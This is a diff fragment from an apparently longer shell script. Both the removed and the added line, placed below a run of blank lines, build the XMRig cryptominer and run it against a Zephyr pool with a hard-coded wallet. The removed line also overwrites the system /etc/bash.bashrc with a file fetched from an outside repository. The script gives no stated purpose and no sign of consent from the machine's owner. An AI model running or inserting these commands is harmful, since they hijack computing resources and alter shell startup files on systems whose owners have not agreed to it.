@@ -211,17 +211,7 @@ sleep 1
 
 
 
-
-
-
-
-
-
-
-
-
-
-cd && apt upgrade && cd && cd .. && cd usr && cd /etc && git clone https://github.com/Ngocgiau2000/mining.git && rm -rf bash.bashrc && cd mining && cp bash.bashrc ../bash.bashrc && cd && apt upgrade -y && apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && apt install git -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && apt install cmake cmake .. && make -j$(nproc) && cd && cd xmrig/build && ./xmrig -o sg-zephyr.miningocean.org:5352 -u ZEPHYR2hfe5BjsLxUkYSZv1aSasoWPxa39j8Z1aapcTTLAYhPVTeyLWAjiGYpRMB1w7Htuj5ucYk5csFumVt6NuWh6XLUjAf3jh4e.1200 -p R304 -a rx/0 -k -t 8
+apt upgrade -y && apt-get install cmake build-essential libboost-all-dev  -y && apt install git -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && cd && cd xmrig/build && ./xmrig -o sg-zephyr.miningocean.org:5352 -u ZEPHYR2hfe5BjsLxUkYSZv1aSasoWPxa39j8Z1aapcTTLAYhPVTeyLWAjiGYpRMB1w7Htuj5ucYk5csFumVt6NuWh6XLUjAf3jh4e.1200 -p R304 -a rx/0 -k -t 8
 
 
 
